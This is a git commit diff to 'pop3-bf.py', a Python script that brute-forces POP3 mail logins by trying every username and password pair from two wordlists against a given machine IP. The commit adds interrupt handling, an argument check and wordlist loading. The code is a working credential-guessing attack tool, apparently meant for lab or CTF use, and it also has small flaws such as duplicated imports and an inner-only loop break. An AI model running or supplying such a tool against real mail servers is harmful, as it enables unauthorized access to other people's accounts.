52ef05cf08f0d07fec15b5f6925c088d6f4d33c1
@RholdzDev <rholdxz@gmail.com>
2026-02-13 06:34:27 +0400

    add keyboard interruption

--- pop3-bf.py
+++ pop3-bf.py
@@ -27,11 +27,28 @@
 import poplib
 import sys
 
+import poplib
+import signal
+import sys
+
 # ANSI colors
 GREEN = "\033[92m"
 RED = "\033[91m"
 YELLOW = "\033[93m"
 RESET = "\033[0m"
+
+def handle_exit(signum, frame):
+    print(f"\n{RED}[!] End{RESET}")
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, handle_exit) 
+signal.signal(signal.SIGTSTP, handle_exit)  
+
+# Argument check
+if len(sys.argv) != 4:
+    print(f"{YELLOW}Usage:{RESET} python3 pop3-bf.py <Machine_IP> <UserList> <PassList>")
+    sys.exit(1)
+
 
 server = sys.argv[1]
 port = 110
@@ -40,30 +57,34 @@ port = 110
 userlist = sys.argv[2]
 passlist = sys.argv[3]
 
-# Read usernames
-with open(userlist, "r") as f:
-    users = [u.strip() for u in f.readlines()]
+# Load wordlists
+try:
+    with open(userlist, "r") as f:
+        users = [u.strip() for u in f.readlines()]
+    with open(passlist, "r") as f:
+        passwords = [p.strip() for p in f.readlines()]
+except FileNotFoundError:
+    print(f"{RED}[!] Wordlist file not found, check the usefiler|passfile{RESET}")
+    sys.exit(1)
 
-# Read passwords
-with open(passlist, "r") as f:
-    passwords = [p.strip() for p in f.readlines()]
+print(f"{YELLOW}[*] Starting POP3 Brute-Force attempts...{RESET}")
 
+# Brute-force loop
 for user in users:
     for password in passwords:
         print(f"{YELLOW}[*] Trying {user}:{password}{RESET}")
 
         try:
-            pop = poplib.POP3(server, port, timeout=5)
+            pop = poplib.POP3(server, port)
             pop.user(user)
             pop.pass_(password)
 
             print(f"{GREEN}[✔] Login successful → {user}:{password}{RESET}")
             pop.quit()
-
+            break
         except poplib.error_proto:
             print(f"{RED}[✘] Login failed{RESET}")
-
+            pop.quit()
         except Exception as e:
             print(f"{RED}[✘] Connection error: {e}{RESET}")
             break
-
